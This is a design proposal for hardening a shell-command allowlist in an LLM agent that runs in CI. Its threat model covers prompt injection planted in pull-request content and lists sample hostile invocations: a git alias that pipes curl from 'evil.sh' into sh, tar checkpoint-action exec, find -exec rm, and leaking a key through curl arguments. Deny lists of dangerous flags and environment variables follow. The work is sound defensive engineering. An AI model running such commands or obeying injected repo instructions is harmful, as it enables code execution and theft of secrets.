# Hardening the `shell_exec` Allowlist — Research

Status: research / proposal (no code changes on this branch)
Branch: `research/allowlist-hardening`
Date: 2026-07-25

## 1. Current state

Since v1.0.9, `ShellExecTool` (`crates/clausura-core/src/tools.rs`):

- Takes `argv: string[]` and executes `Command::new(&argv[0]).args(&argv[1..])`
  directly — **no shell is involved**, so `;`, `|`, `$()`, `>`, globbing and
  variable expansion are inert.
- The allowlist (`task.tool_allowlist` in `.clausura.yaml`, a flat
  `Vec<String>`) is matched against `argv[0]` only, by raw token or basename.
- Empty allowlist (default) disables the tool entirely.
- Output is truncated at 32KB / 1000 lines; the process inherits the full
  parent environment and runs with `current_dir = workspace_root`.

This closed the *shell-parsing* class of bypasses. What remains is the
*allowlist model* itself.

## 2. Threat model

Clausura runs an LLM agent loop against an untrusted codebase in CI. The
attacker model is:

1. **Prompt injection via repo content** — a PR plants instructions in
   source files / issues / diff text that steer the LLM into emitting a
   malicious `shell_exec` call.
2. **Malicious repo artifacts** — scripts, config files (`.gitconfig`,
   `.cargo/config.toml`, `Makefile`), or binaries inside the checked-out repo.
3. **Allowed-binary abuse** — the LLM is tricked into using a *legitimate*
   allowlisted program with dangerous arguments. Examples, all possible
   today with `tool_allowlist: [git, tar, find]`:
   - `git -c alias.status=!id status` (alias injection via `-c`)
   - `git config --global alias.x "!curl evil.sh|sh"` (writes outside workspace)
   - `tar --checkpoint-action=exec=sh ...`
   - `find . -exec rm {} +`
   - any program reading `$CLAUSURA_API_KEY` and exfiltrating it via args
     (e.g. `curl -d $KEY` — but note argv elements are literal; the *LLM*
     can read env-derived secrets from earlier tool output and embed them)
4. **Environment subversion** — inherited env vars change the behavior of
   allowlisted binaries: `PATH` hijacking, `LD_PRELOAD`, `GIT_SSH_COMMAND`,
   `GIT_CONFIG_GLOBAL`/`GIT_CONFIG_COUNT`, `BASH_ENV`, `RUSTFLAGS`, etc.
5. **Filesystem escape via arguments** — allowlisted commands run with cwd
   in the workspace but can read/write absolute paths (`cp /etc/shadow ./x`
   if `cp` were allowed, `git config --global` writing to `$HOME`).
6. **Network exfiltration** — nothing prevents an allowlisted tool with
   network ability (`curl`, `git push`, package managers) from sending data
   out.
7. **Resource exhaustion** — no per-command timeout or output/rlimits beyond
   the post-hoc output truncation; `yes` or a fork bomb allowed by name
   would hang the task until the wall-clock timeout.

## 3. Options survey

### A. argv-prefix rules (per-subcommand granularity)

Allowlist entries become argv *prefixes* instead of bare program names:

```yaml
tool_allowlist:
  - "git status"      # exact prefix: argv must start with ["git", "status"]
  - "git diff"
  - "cargo test"
```

Matching: tokenize the rule, require `argv[..rule.len()] == rule_tokens`.
This is the model Claude Code uses for permissions
(`Bash(git status:*)` / `Bash(npm run test:)` prefix rules, first-match-wins,
see [Claude Code permissions](https://blog.vincentqiao.com/en/posts/claude-code-permissions/)
and [headless CI guidance](https://heyclau.de/entry/guides/headless-claude-code-automation-from-scripts-and-ci)).

- **Security gain**: high. Kills `find -exec`, `tar --checkpoint-action`,
  and whole dangerous subcommand surfaces (`git config`, `git push`).
- **Cost**: low. `check_allowed` compares token slices; config stays a
  `Vec<String>` — bare names keep today's meaning (prefix of length 1),
  so it's backward compatible.
- **Limitation**: flags before the subcommand (`git -c alias.x=!id status`)
  defeat naive prefix matching; needs rule B or flag-position-aware matching.

### B. Per-program flag denylist / argument validators

For known-risky programs, reject dangerous flags regardless of position:

- `git`: deny `-c`, `--exec-path`, `-p/--paginate` is harmless but
  `--git-dir`, `--work-tree` redirect the repo context
- `tar`: deny `--checkpoint-action`, `--to-command`
- generic: deny any arg that resolves to a path outside the workspace
  (see D)

- **Security gain**: medium-high, closes the flag-position hole in A.
- **Cost**: medium. Per-program knowledge is inherently incomplete; must be
  layered on A, not standalone. Fail-closed default: unknown flags are fine
  (they're just args), known-bad flags are rejected.

### C. Environment scrubbing + controlled PATH

Execute with a minimal, explicit environment:

- `env_clear()` then re-add an allowlist: `PATH` (fixed value, e.g.
  `/usr/bin:/bin:/usr/local/bin`), `HOME`, `TERM`, `LANG`, CI vars if needed.
- Critically: **do not forward `CLAUSURA_API_KEY` or any `*_KEY`/`*_TOKEN`**
  to spawned commands, and scrub `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`,
  `GIT_SSH_COMMAND`, `GIT_CONFIG_GLOBAL`, `BASH_ENV`, `ENV`, `RUSTFLAGS`.
- Resolving `argv[0]` against the fixed PATH (not inherited PATH) prevents
  PATH hijacking.

- **Security gain**: high per unit effort. Neutralizes threat #4 and
  shrinks #3/#6 (secrets no longer visible to child processes).
- **Cost**: low. ~30 lines + tests.

### D. Workspace confinement for path arguments

Reject or rewrite path arguments that escape the workspace, reusing
`resolve_sandboxed_path` semantics: absolute paths outside the workspace or
`..` escapes in args → SandboxViolation.

- **Security gain**: medium (threat #5). Not perfect — programs have
  non-obvious ways to touch files (config in `$HOME`), which is why E/F exist.
- **Cost**: medium. False positives for legitimately external paths
  (e.g. `git` reading `$HOME/.gitconfig` is internal to the program and
  unaffected; only *arguments* are checked).

### E. Per-command resource limits

- Hard timeout per invocation (e.g. 60s, configurable) via
  `tokio::time::timeout` + `kill()`; independent of the task wall clock.
- Optional `rlimit` (CPU, address space, no core dumps, process count) via
  `pre_exec` on Unix.

- **Security gain**: medium (threat #7). Also improves CI reliability.
- **Cost**: low for the timeout; medium for rlimits (unsafe `pre_exec`).

### F. OS-level sandbox (strongest, platform-specific)

Wrap execution in a kernel sandbox:

- **Linux**: `bubblewrap` (filesystem view: workspace rw, everything else ro,
  no network) or Landlock+seccomp directly. This is what OpenAI Codex CLI
  does — [Seatbelt on macOS, Landlock+seccomp on Linux, no outgoing network
  by default](https://github.com/simonw/research) (see also
  [Codex sandbox analysis](https://agent-safehouse.dev/docs/agent-investigations/codex)
  and [this deep dive](https://blog.checo.cc/posts/AI/9.html)).
- **macOS**: `sandbox-exec` (Seatbelt) with a generated profile
  (deprecated but functional; Codex still uses it).
- **Fallback**: run the whole task in the existing Docker image — CI users
  already have this option.

- **Security gain**: highest; defends in depth even if A–E have gaps,
  including network denial (#6) and write confinement (#5).
- **Cost**: high. Platform-specific, needs graceful degradation when
  bubblewrap/Seatbelt is unavailable (distro kernels, WSL restrictions —
  Codex hits this in practice). Not a first step.

### G. Replace `shell_exec` with structured narrow tools

Long-term direction: drop generic command execution in favor of
purpose-built tools (`run_tests`, `git_log`, `list_branches`...) whose
parameters are data, not argv. Same philosophy as the existing `git_diff`
tool, extended.

- **Security gain**: very high (no arbitrary execution surface at all).
- **Cost**: high; reduces flexibility; needs per-use-case design.

## 4. Comparison

| Option | Threats addressed | Security gain | Effort | Portability | Backwards compatible |
|--------|-------------------|---------------|--------|-------------|----------------------|
| A. argv-prefix rules | #3 (subcommands) | High | Low | All | Yes (bare name = len-1 prefix) |
| B. flag denylist | #3 (flag injection) | Med-High | Medium | All | Yes |
| C. env scrubbing | #4, leaks via #3/#6 | High | Low | All (unix-focused) | Mostly (edge: workflows relying on inherited env) |
| D. path-arg confinement | #5 | Medium | Medium | All | Mostly |
| E. timeouts/rlimits | #7 | Medium | Low-Med | rlimits are unix-only | Yes |
| F. OS sandbox | #5, #6, depth | Highest | High | Linux/macOS divergent | Yes (opt-in) |
| G. structured tools | all of #3–#5 | Very high | High | All | No (breaking) |

## 5. Recommendation (phased)

**Phase 1 — config-compatible hardening (next minor release):**
A + B + C + E-timeout. (Details settled in §6 Decisions.)

- Rules become prefixes (`"git status"`); bare names unchanged in meaning.
- Built-in flag denylist (token matching, D1) for `git` (`-c`,
  `--exec-path`, `--git-dir`, `--work-tree`), `tar`
  (`--checkpoint-action`, `--to-command`).
- Whitelisted minimal env for spawned commands (D2); never forward
  `CLAUSURA_API_KEY`; fixed PATH.
- 120s default per-command timeout (`task.shell_timeout_secs`, env
  `CLAUSURA_SHELL_TIMEOUT`), global policy (D3).

All four are ~150 lines total, fully covered by unit tests, and keep
existing configs working.

**Phase 2 — OS sandbox (opt-in):**
F behind a config flag (`sandbox: auto|bwrap|seatbelt|none`), with
detection + graceful fallback. CI Linux runners get bubblewrap; local macOS
gets Seatbelt. Document Docker as the always-available strong option.

**Phase 3 — reduce the surface (major release):**
G: evaluate replacing common `shell_exec` use cases with structured tools;
keep `shell_exec` only for advanced use, off by default (as today).

## 6. Decisions (resolved 2026-07-25)

The original open questions were discussed and settled as follows.

### D1. Dangerous-flag matching: token denylist, not getopt parsing

A full getopt-accurate parser needs per-program option tables (which flags
take values, short-flag clustering, subcommand boundaries) — unbounded
complexity that is never complete, and it still cannot see attacks through
the program's own config surface (e.g. `core.pager` in a poisoned repo
`.git/config`, which needs no flag at all). Therefore:

- Denylist entries match argv tokens in all three forms: exact (`-c`),
  attached short-option (`-cfoo=bar`), and long-option prefix
  (`--exec-path`, `--exec-path=...`).
- Matching stops at the `--` terminator; tokens after it are operands and
  are not checked.
- Residual program-config risk is closed via the environment layer (D2):
  `GIT_PAGER=cat`, `GIT_CONFIG_NOSYSTEM=1`, etc.

### D2. Environment: deny-by-default whitelist + exact-name passthrough

- Default keep-list: `PATH` (fixed value
  `/usr/local/bin:/usr/bin:/bin`, plus `$HOME/.cargo/bin` if it exists —
  rustup installs cargo there), `HOME`, `TERM`, `LANG`, `TMPDIR`, `CI`.
- Never forwarded, even if requested: `CLAUSURA_API_KEY` and any
  `*_KEY` / `*_TOKEN` / `*_SECRET` / `*_PASSWORD`; loader hijack vars
  (`LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_*`); runtime injection vars
  (`BASH_ENV`, `ENV`, `PYTHONPATH`, `PERL5LIB`, `RUBYLIB`, `NODE_OPTIONS`,
  `RUSTFLAGS`); git attack surface (`GIT_SSH_COMMAND`, `GIT_ASKPASS`,
  `GIT_CONFIG_GLOBAL`, `GIT_CONFIG_SYSTEM`, `GIT_CONFIG_COUNT`,
  `GIT_CONFIG_KEY_*`, `GIT_CONFIG_VALUE_*`); `SSH_AUTH_SOCK`.
- Safety overrides we set ourselves: `GIT_PAGER=cat`, `PAGER=cat`,
  `GIT_CONFIG_NOSYSTEM=1`, `GIT_TERMINAL_PROMPT=0`, `GIT_EDITOR=:`,
  `EDITOR=:`.
- Escape hatch: `shell_env_passthrough: ["HTTP_PROXY", ...]` — **exact
  variable names only, no globs**; secret-pattern names listed here are
  refused with a warning (fail-closed).

### D3. Policy granularity: global for Phase 1

- `shell_timeout_secs`: one global per-command timeout, default **120s**
  (it is a hang safeguard, not the fork-bomb defense — rlimits are a
  separate concern — so the default favors legitimate slow commands).
- `shell_env_passthrough`: global (D2).
- Evolution path: `tool_allowlist` stays a flat string array; per-rule
  policy, if ever needed, lands as a new `tool_policy` key — a
  non-breaking addition. Matching precedence (longest-prefix-wins) is
  deferred until then.

### D4. Windows: documented non-goal, WSL2/Docker is the answer

- Supported platforms are Linux and macOS. Windows is complex to sandbox
  properly (restricted tokens are a separate engineering effort) and the
  tool is CI-native where Linux dominates — **Windows users should use
  WSL2 or the Docker image**. Documented as a non-goal, not "not yet".
- Keep the door open: Phase 1 code avoids unix-only APIs; unix-specific
  scrub entries are "remove if present", never "must exist", so the code
  keeps compiling on Windows.
- Add a `windows-latest` leg to the CI test matrix to enforce that
  (compile + non-unix-gated tests must pass).
- Phase 2 `sandbox: bwrap|seatbelt` on Windows errors out explicitly —
  no silent degradation.

## 7. References

- Claude Code permission rules (prefix matching, first-match-wins):
  https://blog.vincentqiao.com/en/posts/claude-code-permissions/
- Headless Claude Code in CI (`--allowedTools "Bash(git diff )"`):
  https://heyclau.de/entry/guides/headless-claude-code-automation-from-scripts-and-ci
- Codex CLI sandbox model (Seatbelt / Landlock+seccomp, no network):
  https://agent-safehouse.dev/docs/agent-investigations/codex
- Codex sandbox deep dive (bubblewrap filesystem views, no_new_privs):
  https://blog.checo.cc/posts/AI/9.html
- Simon Willison's research index (Codex sandbox analysis):
  https://github.com/simonw/research
